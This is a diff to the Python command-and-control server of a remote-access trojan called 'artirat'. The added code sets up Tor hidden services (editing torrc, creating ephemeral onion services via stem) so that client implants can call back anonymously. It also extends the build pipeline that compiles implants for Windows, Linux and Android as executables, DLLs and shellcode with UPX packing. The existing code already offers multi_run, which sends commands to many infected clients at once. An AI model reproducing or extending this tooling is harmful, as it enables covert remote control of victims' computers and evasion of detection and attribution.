@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
+import argparse
 import atexit
 import base64
-
 import os
 import readline
+import shutil
 import select
 import socket
 import subprocess
@@ -13,11 +14,11 @@ import time
 
 HISTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".c2_history")
 
-HOST = "0.0.0.0"
+HOST = "127.0.0.1"
 PORT = 1337
 BUFFER_SIZE = 16384
-CONTROL_PORT = 19051
-SOCKS_PORT = 19050
+CONTROL_PORT = 9051
+SOCKS_PORT = 9050
 
 CLIENTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clients")
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -27,6 +28,13 @@ SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
 HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
 CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")
 STREAM_CONFIG_PATH = os.path.join(BASE_DIR, "stream_config.txt")
+TORRC_PATH = os.path.join(BASE_DIR, "torrc")
+SYSTEM_TORRC_CANDIDATES = [
+    "/data/data/com.termux/files/usr/etc/tor/torrc",
+    "/etc/tor/torrc",
+    os.path.expanduser("~/.tor/torrc"),
+    os.path.expanduser("~/torrc"),
+]
 
 _stream_hidden = False
 
@@ -506,12 +514,12 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
 
 
 ALL_BUILD_TARGETS = [
-    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
+    "windows", "linux", "linux32", "windows32", "android",
     "dll-windows", "dll-linux",
     "windows-shellcode", "windows32-shellcode", "linux-shellcode", "linux32-shellcode",
 ]
 EXE_BUILD_TARGETS = [
-    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
+    "windows", "linux", "linux32", "windows32", "android",
 ]
 
 
@@ -542,11 +550,46 @@ def _stream_cargo(cmd, cwd, env, verbose=False):
         return -1
 
 
+def _clean_target(target_triple: str):
+    target_dir = os.path.join(".", "artirat-client", "target", target_triple)
+    release_dir = os.path.join(target_dir, "release")
+    if os.path.exists(release_dir):
+        for item in os.listdir(release_dir):
+            item_path = os.path.join(release_dir, item)
+            if os.path.isfile(item_path):
+                os.remove(item_path)
+            elif os.path.isdir(item_path):
+                shutil.rmtree(item_path)
+        for item in os.listdir(target_dir):
+            item_path = os.path.join(target_dir, item)
+            if item != "release":
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
+
+
+def _dist_binaries(target_triple: str):
+    release_dir = os.path.join(".", "artirat-client", "target", target_triple, "release")
+    if not os.path.exists(release_dir):
+        return
+    dist_dir = os.path.join(".", "dist", target_triple)
+    os.makedirs(dist_dir, exist_ok=True)
+    keep_basenames = {"artirat_client", "libartirat_client"}
+    keep_exts = {".so", ".dll", ".a", ""}
+    for item in os.listdir(release_dir):
+        item_path = os.path.join(release_dir, item)
+        name, ext = os.path.splitext(item)
+        if name in keep_basenames and ext in keep_exts and os.path.isfile(item_path):
+            shutil.copy2(item_path, os.path.join(dist_dir, item))
+            print(f"  -> dist/{target_triple}/{item}")
+    shutil.rmtree(os.path.join(".", "artirat-client", "target"))
+
+
 def build_client(target: str, verbose=False, static=False, upx=False):
     targets = {
         "windows": "x86_64-pc-windows-gnu",
         "linux": "x86_64-unknown-linux-gnu",
-        "linux-musl": "x86_64-unknown-linux-musl",
         "linux32": "i686-unknown-linux-gnu",
         "android": "aarch64-linux-android",
         "windows32": "i686-pc-windows-gnu",
@@ -554,13 +597,24 @@ def build_client(target: str, verbose=False, static=False, upx=False):
         "dll-linux": "x86_64-unknown-linux-gnu",
         "windows-shellcode": "x86_64-pc-windows-gnu",
         "windows32-shellcode": "i686-pc-windows-gnu",
-        "linux-shellcode": "x86_64-unknown-linux-musl",
+        "linux-shellcode": "x86_64-unknown-linux-gnu",
         "linux32-shellcode": "i686-unknown-linux-gnu",
     }
     t = targets.get(target, target)
     is_shellcode = target.endswith("-shellcode")
     is_dll = target.startswith("dll-")
     kind = "SHELLCODE" if is_shellcode else ("DLL/SO" if is_dll else "EXE")
+    result = subprocess.run(["rustup", "target", "list", "--installed"], capture_output=True, text=True)
+    installed = set(result.stdout.strip().split()) if result.returncode == 0 else set()
+    if t not in installed:
+        print(f"[*] Installing rust target {t}...")
+        inst = subprocess.run(["rustup", "target", "add", t], capture_output=True, text=True)
+        if inst.returncode != 0:
+            print(f"[-] Failed to install target {t}: {inst.stderr.strip()}")
+            return False
+        print(f"[+] Installed target {t}")
+    print(f"[*] Cleaning target directory for {t}...")
+    _clean_target(t)
     print(f"[*] Building {kind} for {t} (this may take a while)...")
     env = os.environ.copy()
     if target == "android" or t == "aarch64-linux-android":
@@ -629,6 +683,7 @@ def build_client(target: str, verbose=False, static=False, upx=False):
                     print(f"[-] UPX failed: {result.stderr.strip()}")
             else:
                 print(f"[-] UPX: binary not found at {bin_path}")
+    _dist_binaries(t)
     return True
 
 
@@ -646,8 +701,8 @@ def setup_readline(completer):
 def c2_completer(text, state, manager=None):
     if manager is None:
         return None
-    CMD2 = {"select", "build"}
-    CMD1 = {"list", "exit", "hide_stream", "show_stream"}
+    CMD2 = {"select", "build", "configure_tor"}
+    CMD1 = {"list", "exit", "hide_stream", "show_stream", "write_config"}
     ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
     line = readline.get_line_buffer()
     parts = line.split()
@@ -763,6 +818,11 @@ def c2_menu(manager: ClientManager):
             _stream_hidden = False
             _save_stream_config()
             print("[Stream messages visible]")
+        elif cmd == "write_config":
+            write_config()
+        elif cmd == "configure_tor":
+            port = int(parts[1]) if len(parts) > 1 else 1337
+            configure_tor(port)
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
@@ -771,7 +831,108 @@ def c2_menu(manager: ClientManager):
         elif cmd == "exit":
             break
         else:
-            print("Commands: list, select <id>, multi_run <cmd>, build <target>, exit")
+            print("Commands: list, select <id>, multi_run <cmd>, build <target>, write_config, configure_tor [port], exit")
+
+
+def find_system_torrc():
+    for p in SYSTEM_TORRC_CANDIDATES:
+        if os.path.exists(p):
+            return p
+    if os.path.exists(TORRC_PATH):
+        return TORRC_PATH
+    return None
+
+
+def parse_torrc(path=None):
+    services = []
+    if path is None:
+        path = find_system_torrc()
+    if not path or not os.path.exists(path):
+        return services
+    with open(path) as f:
+        lines = f.readlines()
+    current_dir = None
+    for line in lines:
+        stripped = line.strip()
+        if stripped.startswith("HiddenServiceDir"):
+            current_dir = stripped.split(None, 1)[1].strip()
+        elif stripped.startswith("HiddenServicePort") and current_dir:
+            parts = stripped.split(None, 2)
+            if len(parts) >= 3:
+                services.append((current_dir, parts[1], parts[2]))
+            else:
+                services.append((current_dir, parts[1], ""))
+            current_dir = None
+    return services
+
+
+def get_hostname_from_dir(hs_dir):
+    hostname_file = os.path.join(hs_dir, "hostname")
+    if os.path.exists(hostname_file):
+        with open(hostname_file) as f:
+            return f.read().strip()
+    return None
+
+
+def write_config():
+    old_content = ""
+    if os.path.exists(CLIENT_HOSTNAME_PATH):
+        with open(CLIENT_HOSTNAME_PATH) as f:
+            old_content = f.read()
+    print(f"[Previous config]:\n{old_content.strip() or '(empty)'}")
+
+    services = parse_torrc()
+    lines = []
+    for hs_dir, port, target in services:
+        if "artirat" not in hs_dir.lower():
+            continue
+        hostname = get_hostname_from_dir(hs_dir)
+        if hostname:
+            lines.append(f"{hostname}:{port}")
+    try:
+        from stem.control import Controller
+        controller = Controller.from_port(port=9051)
+        controller.authenticate()
+        print("[+] Connected to Tor for ephemeral hidden service")
+        resp = controller.msg(f"ADD_ONION NEW:BEST Port=1337,127.0.0.1:{PORT}")
+        if resp.is_ok():
+            pairs = dict(line.split("=", 1) for line in resp if "=" in line)
+            service_id = pairs.get("ServiceID", "")
+            onion = f"{service_id}.onion:1337"
+            lines.append(onion)
+            print(f"[+] Ephemeral hidden service: {onion}")
+        else:
+            print(f"[-] ADD_ONION failed: {resp}")
+        controller.close()
+    except Exception as e:
+        print(f"[-] Could not create ephemeral hidden service via stem: {e}")
+
+    if lines:
+        os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
+        with open(CLIENT_HOSTNAME_PATH, "w") as f:
+            f.write("\n".join(lines) + "\n")
+        with open(CLIENT_HOSTNAME_PATH) as f:
+            new_content = f.read()
+        print(f"[New config]:\n{new_content.strip()}")
+        print(f"[+] Wrote {len(lines)} hostname(s) to {CLIENT_HOSTNAME_PATH}")
+    else:
+        print("[-] No hostnames to write")
+
+
+def configure_tor(published_port=1337):
+    torrc = find_system_torrc()
+    if not torrc:
+        torrc = TORRC_PATH
+    services = parse_torrc(torrc)
+    for hs_dir, port, target in services:
+        if "artirat" in hs_dir.lower():
+            print(f"[-] Hidden service already configured for {hs_dir} (port {port})")
+            return
+    we_write = torrc if os.access(torrc, os.W_OK) else TORRC_PATH
+    with open(we_write, "a") as f:
+        f.write(f"\nHiddenServiceDir /var/lib/tor/artirat-server\n")
+        f.write(f"HiddenServicePort {published_port} 127.0.0.1:1337\n")
+    print(f"[+] Added HiddenServiceDir /var/lib/tor/artirat-server with port {published_port} -> 127.0.0.1:1337 to {we_write}")
 
 
 def connect_tor():
@@ -829,4 +990,53 @@ def run_c2_server():
 
 
 if __name__ == "__main__":
-    run_c2_server()
+    parser = argparse.ArgumentParser(description="artirat C2 server and build tool")
+    parser.add_argument("-x", "--execute", nargs='+', help="Execute a command non-interactively (e.g. 'build linux --static')")
+    parser.add_argument("-w", "--write-hostname", action="store_true", help="Parse torrc and write hostname:port to client config")
+    args = parser.parse_args()
+
+    if args.write_hostname:
+        write_config()
+        sys.exit(0)
+
+    if args.execute:
+        cmdline = " ".join(args.execute)
+        commands = cmdline.split(";")
+        for raw in commands:
+            raw = raw.strip()
+            if not raw:
+                continue
+            parts = raw.split()
+            cmd = parts[0]
+            verbose = "--verbose" in parts
+            static = "--static" in parts
+            upx = "--upx" in parts
+            if cmd == "build":
+                if len(parts) < 2 or parts[1] in ("--verbose", "--static", "--upx"):
+                    print("Usage: build <target> [--verbose] [--static] [--upx]")
+                    print("       build all [--verbose] [--static] [--upx]")
+                    print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
+                    sys.exit(1)
+                target_arg = parts[1]
+                if target_arg == "all":
+                    targets = EXE_BUILD_TARGETS
+                    for t in targets:
+                        print(f"\n{'='*60}")
+                        build_client(t, verbose=verbose, static=static, upx=upx)
+                    print(f"\n{'='*60}")
+                    print("[+] All builds finished")
+                else:
+                    ok = build_client(target_arg, verbose=verbose, static=static, upx=upx)
+                    if not ok:
+                        sys.exit(1)
+            elif cmd == "write_config":
+                write_config()
+            elif cmd == "configure_tor":
+                port = int(parts[1]) if len(parts) > 1 else 1337
+                configure_tor(port)
+            else:
+                print(f"[-] Unknown command: {cmd}")
+                print("    Commands: build, write_config, configure_tor")
+                sys.exit(1)
+    else:
+        run_c2_server()
